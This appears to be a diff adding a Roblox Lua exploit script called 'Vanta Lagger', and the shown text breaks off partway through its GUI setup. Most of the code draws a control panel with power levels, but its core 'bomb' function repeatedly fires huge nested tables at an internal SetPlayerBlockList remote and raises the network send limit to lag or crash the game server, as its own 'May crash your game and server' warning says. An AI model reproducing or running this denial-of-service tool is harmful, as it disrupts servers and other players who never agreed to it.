@@ -1,0 +1,1174 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local ConfigFile = "VantaLaggerConfig.json"
+
+local LEVELS = {
+    Low     = { power = 23 },
+    Mid     = { power = 32 },
+    High    = { power = 70 },
+    Ultra   = { power = 90 }
+}
+
+local keybind = Enum.KeyCode.H
+local laggerActive = false
+local lagThread = nil
+local currentLevel = "Low"
+local windowLocked = false
+local ultraConfirmed = false
+local changingLevel = false
+local windowMinimized = false
+
+local MIN_SIZE = UDim2.new(0, 160, 0, 96)
+local MAX_SIZE = UDim2.new(0, 320, 0, 192)
+local currentSize = UDim2.new(0, 200, 0, 120)
+local scaleFactor = 1
+
+local UI_CONFIG = {
+    MainBg       = Color3.fromRGB(10, 10, 10),
+    TextColor    = Color3.fromRGB(255, 255, 255),
+    ButtonInact  = Color3.fromRGB(25, 25, 25),
+    ButtonAct    = Color3.fromRGB(255, 255, 255),
+    ToggleOff    = Color3.fromRGB(30, 30, 30),
+    ToggleOn     = Color3.fromRGB(255, 255, 255),
+    Font         = Enum.Font.GothamBold,
+    BorderColor  = Color3.fromRGB(80, 80, 80),
+    endBorderColor  = Color3.fromRGB(80, 80, 80)
+}
+
+local function SaveConfig()
+    local data = {
+        Level = currentLevel,
+        Locked = windowLocked,
+        Minimized = windowMinimized,
+        PosX = mainFrame and mainFrame.Position.X.Scale or 0.15,
+        PosY = mainFrame and mainFrame.Position.Y.Scale or 0.5,
+        OffsetX = mainFrame and mainFrame.Position.X.Offset or 0,
+        OffsetY = mainFrame and mainFrame.Position.Y.Offset or -50,
+        SizeX = currentSize.X.Offset,
+        SizeY = currentSize.Y.Offset,
+        ScaleFactor = scaleFactor
+    }
+    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
+end
+
+local function LoadConfig()
+    local loadedPos = {ScaleX = 0.15, ScaleY = 0.5, OffsetX = 0, OffsetY = -50}
+    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
+        pcall(function()
+            local data = HttpService:JSONDecode(readfile(ConfigFile))
+            currentLevel = data.Level or "Low"
+            windowLocked = data.Locked or false
+            windowMinimized = data.Minimized or false
+            loadedPos.ScaleX = data.PosX or 0.15
+            loadedPos.ScaleY = data.PosY or 0.5
+            loadedPos.OffsetX = data.OffsetX or 0
+            loadedPos.OffsetY = data.OffsetY or -50
+            local savedSizeX = data.SizeX or 200
+            local savedSizeY = data.SizeY or 120
+            currentSize = UDim2.new(0, math.clamp(savedSizeX, MIN_SIZE.X.Offset, MAX_SIZE.X.Offset), 0, math.clamp(savedSizeY, MIN_SIZE.Y.Offset, MAX_SIZE.Y.Offset))
+            scaleFactor = data.ScaleFactor or 1
+        end)
+    end
+    return loadedPos
+end
+
+local savedPos = LoadConfig()
+
+local function bomb(power)
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
+    local max = math.min(12000, power * 50)
+    for i = 1, max do table.insert(main, spam) end
+    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
+end
+
+local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, btnUltra, lockToggleContainer, lockToggleBall, lockToggleClick
+local titleLabel, textEnable, textLagger, toggleClick
+local mainFrame, glitchOverlay, scanline1, scanline2
+local powerIndicator, statusDot
+local screenGui, logoImage
+local popupOpen = false
+local btnPlus, btnMinus, btnMinimize
+
+local function updateUIScale()
+    if not mainFrame then return end
+    
+    local baseSizeX = 200
+    local baseSizeY = 120
+    
+    local scaledSizeX = currentSize.X.Offset
+    local scaledSizeY = currentSize.Y.Offset
+    
+    local sx = scaledSizeX / baseSizeX
+    local sy = scaledSizeY / baseSizeY
+    
+    if titleLabel then
+        titleLabel.TextSize = math.clamp(math.floor(11 * math.min(sx, sy)), 8, 16)
+        titleLabel.Size = UDim2.new(1, -190 * sx, 0, 26 * sy)
+        titleLabel.Position = UDim2.new(0, 12 * sx, 0, 0)
+    end
+    
+    if textEnable then
+        textEnable.TextSize = math.clamp(math.floor(9 * math.min(sx, sy)), 6, 14)
+        textEnable.Position = UDim2.new(0, 10 * sx, 0, 32 * sy)
+        textEnable.Size = UDim2.new(0, 38 * sx, 0, 16 * sy)
+    end
+    
+    if textLagger then
+        textLagger.TextSize = math.clamp(math.floor(9 * math.min(sx, sy)), 6, 14)
+        textLagger.Position = UDim2.new(0, 50 * sx, 0, 32 * sy)
+        textLagger.Size = UDim2.new(0, 42 * sx, 0, 16 * sy)
+    end
+    
+    if toggleContainer then
+        if windowMinimized then
+            toggleContainer.Position = UDim2.new(1, -112 * sx, 0, 5 * sy)
+            toggleContainer.Size = UDim2.new(0, 38 * sx, 0, 16 * sy)
+        else
+            toggleContainer.Position = UDim2.new(1, -60 * sx, 0, 30 * sy)
+            toggleContainer.Size = UDim2.new(0, 50 * sx, 0, 20 * sy)
+        end
+    end
+    
+    if toggleBall then
+        if windowMinimized then
+            toggleBall.Size = UDim2.new(0, 14 * sx, 0, 14 * sy)
+            toggleBall.Position = laggerActive and UDim2.new(1, -14 * sx, 0.5, -7 * sy) or UDim2.new(0, 2 * sx, 0.5, -7 * sy)
+        else
+            toggleBall.Size = UDim2.new(0, 18 * sx, 0, 18 * sy)
+            toggleBall.Position = laggerActive and UDim2.new(1, -18 * sx, 0.5, -9 * sy) or UDim2.new(0, 3 * sx, 0.5, -9 * sy)
+        end
+    end
+    
+    if toggleClick then
+        toggleClick.TextSize = math.clamp(math.floor((windowMinimized and 7 or 9) * math.min(sx, sy)), 5, 14)
+    end
+    
+    if lockToggleContainer then
+        lockToggleContainer.Position = UDim2.new(1, -60 * sx, 0, 7 * sy)
+        lockToggleContainer.Size = UDim2.new(0, 50 * sx, 0, 16 * sy)
+    end
+    
+    if lockToggleBall then
+        lockToggleBall.Size = UDim2.new(0, 14 * sx, 0, 14 * sy)
+        lockToggleBall.Position = windowLocked and UDim2.new(1, -14 * sx, 0.5, -7 * sy) or UDim2.new(0, 2 * sx, 0.5, -7 * sy)
+    end
+    
+    if lockToggleClick then
+        lockToggleClick.TextSize = math.clamp(math.floor(7 * math.min(sx, sy)), 5, 12)
+    end
+    
+    if powerIndicator then
+        powerIndicator.TextSize = math.clamp(math.floor(8 * math.min(sx, sy)), 5, 13)
+        powerIndicator.Position = UDim2.new(0, 10 * sx, 0, 60 * sy)
+    end
+    
+    if btnLow then
+        local btnW = math.floor(42 * sx)
+        local btnH = math.floor(22 * sy)
+        local spacing = math.floor(5 * sx)
+        local leftMargin = math.floor(9 * sx)
+        local btnY = math.floor(84 * sy)
+        
+        btnLow.Size = UDim2.new(0, btnW, 0, btnH)
+        btnLow.Position = UDim2.new(0, leftMargin, 0, btnY)
+        btnLow.TextSize = math.clamp(math.floor(9 * math.min(sx, sy)), 6, 14)
+        
+        btnMid.Size = UDim2.new(0, btnW, 0, btnH)
+        btnMid.Position = UDim2.new(0, leftMargin + btnW + spacing, 0, btnY)
+        btnMid.TextSize = math.clamp(math.floor(9 * math.min(sx, sy)), 6, 14)
+        
+        btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
+        btnHigh.Position = UDim2.new(0, leftMargin + (btnW + spacing) * 2, 0, btnY)
+        btnHigh.TextSize = math.clamp(math.floor(9 * math.min(sx, sy)), 6, 14)
+        
+        btnUltra.Size = UDim2.new(0, btnW + math.floor(4 * sx), 0, btnH)
+        btnUltra.Position = UDim2.new(0, leftMargin + (btnW + spacing) * 3, 0, btnY)
+        btnUltra.TextSize = math.clamp(math.floor(8 * math.min(sx, sy)), 5, 13)
+    end
+    
+    if btnMinimize then
+        btnMinimize.Position = UDim2.new(1, -138 * sx, 0, 5 * sy)
+        btnMinimize.Size = UDim2.new(0, 18 * sx, 0, 16 * sy)
+        btnMinimize.TextSize = math.clamp(math.floor(10 * math.min(sx, sy)), 7, 16)
+    end
+
+    if btnPlus then
+        btnPlus.Position = UDim2.new(1, -118 * sx, 0, 5 * sy)
+        btnPlus.Size = UDim2.new(0, 18 * sx, 0, 16 * sy)
+        btnPlus.TextSize = math.clamp(math.floor(10 * math.min(sx, sy)), 7, 16)
+    end
+    
+    if btnMinus then
+        btnMinus.Position = UDim2.new(1, -98 * sx, 0, 5 * sy)
+        btnMinus.Size = UDim2.new(0, 18 * sx, 0, 16 * sy)
+        btnMinus.TextSize = math.clamp(math.floor(10 * math.min(sx, sy)), 7, 16)
+    end
+    
+    if statusDot then
+        statusDot.Size = UDim2.new(0, math.clamp(math.floor(5 * math.min(sx, sy)), 3, 8), 0, math.clamp(math.floor(5 * math.min(sx, sy)), 3, 8))
+        statusDot.Position = UDim2.new(0, 2 * sx, 0, 10 * sy)
+    end
+end
+
+local function toggleMinimizeWindow()
+    windowMinimized = not windowMinimized
+    
+    local sx = currentSize.X.Offset / 200
+    local sy = currentSize.Y.Offset / 120
+    local minimizedHeight = math.floor(26 * sy)
+    
+    local targetSize = windowMinimized and UDim2.new(0, currentSize.X.Offset, 0, minimizedHeight) or currentSize
+    
+    btnMinimize.Text = windowMinimized and "□" or "_"
+    
+    -- Animar resize de la ventana
+    TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
+        Size = targetSize
+    }):Play()
+    
+    -- Ocultar otros elementos pero conservar el toggleVisible
+    local elementsToHide = {
+        textEnable, textLagger, powerIndicator,
+        btnLow, btnMid, btnHigh, btnUltra
+    }
+    
+    for _, elem in ipairs(elementsToHide) do
+        if elem then elem.Visible = not windowMinimized end
+    end
+
+    -- Re-escalar y acomodar el toggle
+    updateUIScale()
+    SaveConfig()
+end
+
+local function showUltraConfirmation(callback)
+    if popupOpen then return end
+    popupOpen = true
+
+    local overlay = Instance.new("Frame")
+    overlay.Name = "UltraOverlay"
+    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    overlay.BackgroundTransparency = 0.65
+    overlay.Size = UDim2.new(1, 0, 1, 0)
+    overlay.Position = UDim2.new(0, 0, 0, 0)
+    overlay.ZIndex = 98
+    overlay.Parent = screenGui
+
+    local confirmFrame = Instance.new("Frame")
+    confirmFrame.Name = "UltraConfirm"
+    confirmFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+    confirmFrame.BorderSizePixel = 0
+    confirmFrame.Size = UDim2.new(0, 240, 0, 100)
+    confirmFrame.Position = UDim2.new(0.5, -120, 0.5, -50)
+    confirmFrame.ZIndex = 100
+    confirmFrame.Parent = screenGui
+    confirmFrame.ClipsDescendants = true
+    Instance.new("UICorner", confirmFrame).CornerRadius = UDim.new(0, 10)
+
+    local confirmStroke = Instance.new("UIStroke", confirmFrame)
+    confirmStroke.Color = Color3.fromRGB(255, 255, 255)
+    confirmStroke.Thickness = 2
+    confirmStroke.Transparency = 0.3
+
+    local warningIcon = Instance.new("TextLabel", confirmFrame)
+    warningIcon.BackgroundTransparency = 1
+    warningIcon.Size = UDim2.new(1, 0, 0, 24)
+    warningIcon.Position = UDim2.new(0, 0, 0, 10)
+    warningIcon.Font = Enum.Font.GothamBlack
+    warningIcon.Text = "ULTRA MODE"
+    warningIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
+    warningIcon.TextSize = 15
+    warningIcon.ZIndex = 101
+
+    local warningText = Instance.new("TextLabel", confirmFrame)
+    warningText.BackgroundTransparency = 1
+    warningText.Size = UDim2.new(1, -30, 0, 18)
+    warningText.Position = UDim2.new(0, 15, 0, 36)
+    warningText.Font = UI_CONFIG.Font
+    warningText.Text = "May crash your game and server."
+    warningText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    warningText.TextSize = 9
+    warningText.ZIndex = 101
+
+    local warningText2 = Instance.new("TextLabel", confirmFrame)
+    warningText2.BackgroundTransparency = 1
+    warningText2.Size = UDim2.new(1, -30, 0, 16)
+    warningText2.Position = UDim2.new(0, 15, 0, 52)
+    warningText2.Font = UI_CONFIG.Font
+    warningText2.Text = "Are you sure you want to enable ULTRA?"
+    warningText2.TextColor3 = Color3.fromRGB(160, 160, 160)
+    warningText2.TextSize = 9
+    warningText2.ZIndex = 101
+
+    local btnYes = Instance.new("TextButton", confirmFrame)
+    btnYes.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    btnYes.Size = UDim2.new(0, 90, 0, 26)
+    btnYes.Position = UDim2.new(0, 25, 0, 68)
+    btnYes.Font = UI_CONFIG.Font
+    btnYes.Text = "YES, ENABLE"
+    btnYes.TextColor3 = Color3.fromRGB(0, 0, 0)
+    btnYes.TextSize = 10
+    btnYes.AutoButtonColor = false
+    btnYes.ZIndex = 101
+    Instance.new("UICorner", btnYes).CornerRadius = UDim.new(0, 5)
+
+    local btnNo = Instance.new("TextButton", confirmFrame)
+    btnNo.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    btnNo.Size = UDim2.new(0, 90, 0, 26)
+    btnNo.Position = UDim2.new(0, 125, 0, 68)
+    btnNo.Font = UI_CONFIG.Font
+    btnNo.Text = "NO, CANCEL"
+    btnNo.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btnNo.TextSize = 10
+    btnNo.AutoButtonColor = false
+    btnNo.ZIndex = 101
+    Instance.new("UICorner", btnNo).CornerRadius = UDim.new(0, 5)
+
+    local function closePopup()
+        confirmFrame:Destroy()
+        overlay:Destroy()
+        popupOpen = false
+    end
+
+    btnYes.MouseEnter:Connect(function()
+        TweenService:Create(btnYes, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(200, 200, 200),
+            Size = UDim2.new(0, 95, 0, 28)
+        }):Play()
+    end)
+
+    btnYes.MouseLeave:Connect(function()
+        TweenService:Create(btnYes, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+            Size = UDim2.new(0, 90, 0, 26)
+        }):Play()
+    end)
+
+    btnNo.MouseEnter:Connect(function()
+        TweenService:Create(btnNo, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(60, 60, 60),
+            Size = UDim2.new(0, 95, 0, 28)
+        }):Play()
+    end)
+
+    btnNo.MouseLeave:Connect(function()
+        TweenService:Create(btnNo, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(40, 40, 40),
+            Size = UDim2.new(0, 90, 0, 26)
+        }):Play()
+    end)
+
+    btnYes.MouseButton1Click:Connect(function()
+        closePopup()
+        ultraConfirmed = true
+        callback(true)
+    end)
+
+    btnNo.MouseButton1Click:Connect(function()
+        closePopup()
+        ultraConfirmed = false
+        callback(false)
+    end)
+end
+
+local function animateButton(btn)
+    local originalSize = btn.Size
+    TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, btn.Size.X.Offset - 3, 0, btn.Size.Y.Offset - 3)
+    }):Play()
+    task.wait(0.1)
+    TweenService:Create(btn, TweenInfo.new(0.2, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, btn.Size.X.Offset + 3, 0, btn.Size.Y.Offset + 3)
+    }):Play()
+    task.wait(0.15)
+    TweenService:Create(btn, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        Size = originalSize
+    }):Play()
+end
+
+local function updateLevelButtons()
+    if currentLevel == "Low" then
+        btnLow.BackgroundColor3 = UI_CONFIG.ButtonAct
+        btnLow.TextColor3 = Color3.fromRGB(0, 0, 0)
+        btnLow.BorderSizePixel = 0
+    else
+        btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
+        btnLow.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btnLow.BorderSizePixel = 1
+        btnLow.BorderColor3 = UI_CONFIG.BorderColor
+    end
+
+    if currentLevel == "Mid" then
+        btnMid.BackgroundColor3 = UI_CONFIG.ButtonAct
+        btnMid.TextColor3 = Color3.fromRGB(0, 0, 0)
+        btnMid.BorderSizePixel = 0
+    else
+        btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
+        btnMid.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btnMid.BorderSizePixel = 1
+        btnMid.BorderColor3 = UI_CONFIG.BorderColor
+    end
+
+    if currentLevel == "High" then
+        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonAct
+        btnHigh.TextColor3 = Color3.fromRGB(0, 0, 0)
+        btnHigh.BorderSizePixel = 0
+    else
+        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
+        btnHigh.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btnHigh.BorderSizePixel = 1
+        btnHigh.BorderColor3 = UI_CONFIG.BorderColor
+    end
+
+    if currentLevel == "Ultra" then
+        btnUltra.BackgroundColor3 = UI_CONFIG.ButtonAct
+        btnUltra.TextColor3 = Color3.fromRGB(0, 0, 0)
+        btnUltra.BorderSizePixel = 0
+    else
+        btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
+        btnUltra.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btnUltra.BorderSizePixel = 1
+        btnUltra.BorderColor3 = UI_CONFIG.BorderColor
+    end
+end
+
+local function updateLockToggle()
+    if lockToggleContainer then
+        lockToggleContainer.BackgroundColor3 = windowLocked and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+    end
+    if lockToggleBall then
+        lockToggleBall.BackgroundColor3 = windowLocked and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
+        if windowLocked then
+            lockToggleBall.Position = UDim2.new(1, -14, 0.5, -7)
+        else
+            lockToggleBall.Position = UDim2.new(0, 2, 0.5, -7)
+        end
+    end
+    if lockToggleClick then
+        lockToggleClick.Text = windowLocked and "LOCK" or "UNLOCK"
+        if windowLocked then
+            lockToggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            lockToggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
+        else
+            lockToggleClick.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+            lockToggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
+        end
+    end
+end
+
+local function updateSwitch()
+    local sx = currentSize.X.Offset / 200
+    local sy = currentSize.Y.Offset / 120
+
+    if toggleContainer then
+        toggleContainer.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+    end
+    if toggleBall then
+        toggleBall.BackgroundColor3 = laggerActive and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
+        if windowMinimized then
+            toggleBall.Position = laggerActive and UDim2.new(1, -14 * sx, 0.5, -7 * sy) or UDim2.new(0, 2 * sx, 0.5, -7 * sy)
+        else
+            toggleBall.Position = laggerActive and UDim2.new(1, -18 * sx, 0.5, -9 * sy) or UDim2.new(0, 3 * sx, 0.5, -9 * sy)
+        end
+    end
+    if toggleClick then
+        toggleClick.Text = laggerActive and "ON" or "OFF"
+        if laggerActive then
+            toggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            toggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
+        else
+            toggleClick.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+            toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
+        end
+    end
+    if powerIndicator then
+        if laggerActive then
+            powerIndicator.Text = currentLevel:upper()
+            powerIndicator.TextColor3 = Color3.fromRGB(255, 255, 255)
+        else
+            powerIndicator.Text = "STANDBY"
+            powerIndicator.TextColor3 = Color3.fromRGB(120, 120, 120)
+        end
+    end
+    if statusDot then
+        if laggerActive and currentLevel == "Ultra" then
+            statusDot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        else
+            statusDot.BackgroundColor3 = laggerActive and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(80, 80, 80)
+        end
+    end
+end
+
+local function triggerGlitch()
+    if not mainFrame or not glitchOverlay then return end
+
+    local duration = 0.05 + math.random() * 0.1
+    local intensity = math.random(1, 3)
+
+    glitchOverlay.Visible = true
+    glitchOverlay.ImageTransparency = 0.7 + math.random() * 0.2
+
+    local offsetX = (math.random() - 0.5) * intensity * 4
+    local offsetY = (math.random() - 0.5) * intensity * 3
+
+    TweenService:Create(mainFrame, TweenInfo.new(0.02, Enum.EasingStyle.Linear), {
+        Position = UDim2.new(mainFrame.Position.X.Scale, mainFrame.Position.X.Offset + offsetX, mainFrame.Position.Y.Scale, mainFrame.Position.Y.Offset + offsetY)
+    }):Play()
+
+    if scanline1 then
+        scanline1.Visible = math.random() < 0.5
+        scanline1.Position = UDim2.new(0, 0, math.random(), 0)
+    end
+    if scanline2 then
+        scanline2.Visible = math.random() < 0.5
+        scanline2.Position = UDim2.new(0, 0, math.random(), 0)
+    end
+
+    if titleLabel and math.random() < 0.3 then
+        local glitchTexts = {"VANTA L4GGER", "V4NTA LAGGER", "VANTA LAGG3R", "V@NTA LAGGER"}
+        titleLabel.Text = glitchTexts[math.random(1, #glitchTexts)]
+        task.delay(0.08, function()
+            if titleLabel then titleLabel.Text = "VANTA LAGGER" end
+        end)
+    end
+
+    task.delay(duration, function()
+        if mainFrame then
+            TweenService:Create(mainFrame, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {
+                Position = UDim2.new(mainFrame.Position.X.Scale, mainFrame.Position.X.Offset - offsetX, mainFrame.Position.Y.Scale, mainFrame.Position.Y.Offset - offsetY)
+            }):Play()
+        end
+        if glitchOverlay then
+            glitchOverlay.Visible = false
+        end
+        if scanline1 then scanline1.Visible = false end
+        if scanline2 then scanline2.Visible = false end
+    end)
+end
+
+local function startLagThread()
+    if lagThread then
+        task.cancel(lagThread)
+        lagThread = nil
+    end
+
+    if not laggerActive then return end
+
+    lagThread = task.spawn(function()
+        while laggerActive do
+            pcall(function()
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
+            end)
+            bomb(LEVELS[currentLevel].power)
+            task.wait(0.18)
+        end
+    end)
+end
+
+local function expandPanel()
+    if windowMinimized then return end
+    local newSizeX = math.min(currentSize.X.Offset + 20, MAX_SIZE.X.Offset)
+    local newSizeY = math.min(currentSize.Y.Offset + 12, MAX_SIZE.Y.Offset)
+    currentSize = UDim2.new(0, newSizeX, 0, newSizeY)
+    scaleFactor = newSizeX / 200
+    
+    mainFrame.Size = currentSize
+    updateUIScale()
+    SaveConfig()
+end
+
+local function shrinkPanel()
+    if windowMinimized then return end
+    local newSizeX = math.max(currentSize.X.Offset - 20, MIN_SIZE.X.Offset)
+    local newSizeY = math.max(currentSize.Y.Offset - 12, MIN_SIZE.Y.Offset)
+    currentSize = UDim2.new(0, newSizeX, 0, newSizeY)
+    scaleFactor = newSizeX / 200
+    
+    mainFrame.Size = currentSize
+    updateUIScale()
+    SaveConfig()
+end
+
+local function toggleLagger()
+    if changingLevel then return end
+    
+    laggerActive = not laggerActive
+
+    local sx = currentSize.X.Offset / 200
+    local sy = currentSize.Y.Offset / 120
+
+    local targetPos = laggerActive and (windowMinimized and UDim2.new(1, -14 * sx, 0.5, -7 * sy) or UDim2.new(1, -18 * sx, 0.5, -9 * sy)) or (windowMinimized and UDim2.new(0, 2 * sx, 0.5, -7 * sy) or UDim2.new(0, 3 * sx, 0.5, -9 * sy))
+    local targetColor = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+
+    TweenService:Create(toggleBall, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Position = targetPos,
+        BackgroundColor3 = laggerActive and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
+    }):Play()
+
+    TweenService:Create(toggleContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundColor3 = targetColor
+    }):Play()
+
+    toggleClick.Text = laggerActive and "ON" or "OFF"
+
+    if laggerActive then
+        toggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        toggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
+        TweenService:Create(toggleClick, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            TextSize = toggleClick.TextSize + 2
+        }):Play()
+        task.wait(0.15)
+        TweenService:Create(toggleClick, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            TextSize = toggleClick.TextSize - 2
+        }):Play()
+    else
+        toggleClick.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
+    end
+
+    updateSwitch()
+
+    if laggerActive then
+        startLagThread()
+    else
+        if lagThread then
+            task.cancel(lagThread)
+            lagThread = nil
+        end
+    end
+end
+
+local function changeLevel(newLevel)
+    if changingLevel then return end
+    if newLevel == currentLevel then return end
+    
+    changingLevel = true
+
+    if newLevel == "Ultra" and not ultraConfirmed then
+        showUltraConfirmation(function(accepted)
+            if accepted then
+                currentLevel = "Ultra"
+                updateLevelButtons()
+                updateSwitch()
+                SaveConfig()
+                if laggerActive then
+                    startLagThread()
+                end
+            end
+            changingLevel = false
+        end)
+        return
+    end
+
+    currentLevel = newLevel
+    updateLevelButtons()
+    updateSwitch()
+    SaveConfig()
+
+    if laggerActive then
+        startLagThread()
+    end
+    
+    changingLevel = false
+end
+
+if CoreGui:FindFirstChild("VantaLagger_UI") then
+    CoreGui.VantaLagger_UI:Destroy()
+end
+
+screenGui = Instance.new("ScreenGui")
+screenGui.Name = "VantaLagger_UI"
+screenGui.Parent = CoreGui
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+
+mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.BackgroundColor3 = UI_CONFIG.MainBg
+mainFrame.BackgroundTransparency = 1
+mainFrame.BorderSizePixel = 0
+mainFrame.Size = currentSize
+mainFrame.Position = UDim2.new(savedPos.ScaleX, savedPos.OffsetX, savedPos.ScaleY, savedPos.OffsetY)
+mainFrame.Parent = screenGui
+mainFrame.ClipsDescendants = true
+
+logoImage = Instance.new("ImageLabel")
+logoImage.Name = "LogoBackground"
+logoImage.BackgroundTransparency = 1
+logoImage.Size = UDim2.new(1, 0, 1, 0)
+logoImage.Position = UDim2.new(0, 0, 0, 0)
+logoImage.Image = "rbxassetid://115032718255779"
+logoImage.ScaleType = Enum.ScaleType.Crop
+logoImage.ZIndex = 0
+logoImage.Parent = mainFrame
+Instance.new("UICorner", logoImage).CornerRadius = UDim.new(0, 6)
+
+local bgOverlay = Instance.new("Frame")
+bgOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bgOverlay.BackgroundTransparency = 0.55
+bgOverlay.BorderSizePixel = 0
+bgOverlay.Size = UDim2.new(1, 0, 1, 0)
+bgOverlay.ZIndex = 2
+bgOverlay.Parent = mainFrame
+Instance.new("UICorner", bgOverlay).CornerRadius = UDim.new(0, 6)
+
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Color = Color3.fromRGB(80, 80, 80)
+mainStroke.Thickness = 1
+mainStroke.Transparency = 0.5
+
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 6)
+
+glitchOverlay = Instance.new("ImageLabel")
+glitchOverlay.Name = "GlitchOverlay"
+glitchOverlay.BackgroundTransparency = 1
+glitchOverlay.Size = UDim2.new(1, 0, 1, 0)
+glitchOverlay.Image = "rbxassetid://16255699706"
+glitchOverlay.ImageTransparency = 1
+glitchOverlay.ScaleType = Enum.ScaleType.Stretch
+glitchOverlay.ZIndex = 10
+glitchOverlay.Visible = false
+glitchOverlay.Parent = mainFrame
+
+scanline1 = Instance.new("Frame")
+scanline1.Name = "Scanline1"
+scanline1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+scanline1.BackgroundTransparency = 0.9
+scanline1.Size = UDim2.new(1, 0, 0, 2)
+scanline1.BorderSizePixel = 0
+scanline1.ZIndex = 9
+scanline1.Visible = false
+scanline1.Parent = mainFrame
+
+scanline2 = Instance.new("Frame")
+scanline2.Name = "Scanline2"
+scanline2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+scanline2.BackgroundTransparency = 0.85
+scanline2.Size = UDim2.new(1, 0, 0, 3)
+scanline2.BorderSizePixel = 0
+scanline2.ZIndex = 9
+scanline2.Visible = false
+scanline2.Parent = mainFrame
+
+-- Minimize Button
+btnMinimize = Instance.new("TextButton", mainFrame)
+btnMinimize.Name = "BtnMinimize"
+btnMinimize.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+btnMinimize.Size = UDim2.new(0, 18, 0, 16)
+btnMinimize.Position = UDim2.new(1, -138, 0, 5)
+btnMinimize.Font = Enum.Font.GothamBlack
+btnMinimize.Text = "_"
+btnMinimize.TextColor3 = Color3.fromRGB(255, 255, 255)
+btnMinimize.TextSize = 10
+btnMinimize.AutoButtonColor = false
+btnMinimize.ZIndex = 11
+btnMinimize.BorderSizePixel = 0
+Instance.new("UICorner", btnMinimize).CornerRadius = UDim.new(0, 4)
+
+btnMinimize.MouseEnter:Connect(function()
+    TweenService:Create(btnMinimize, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    }):Play()
+end)
+
+btnMinimize.MouseLeave:Connect(function()
+    TweenService:Create(btnMinimize, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    }):Play()
+end)
+
+btnMinimize.MouseButton1Click:Connect(function()
+    toggleMinimizeWindow()
+    animateButton(btnMinimize)
+end)
+
+btnMinus = Instance.new("TextButton", mainFrame)
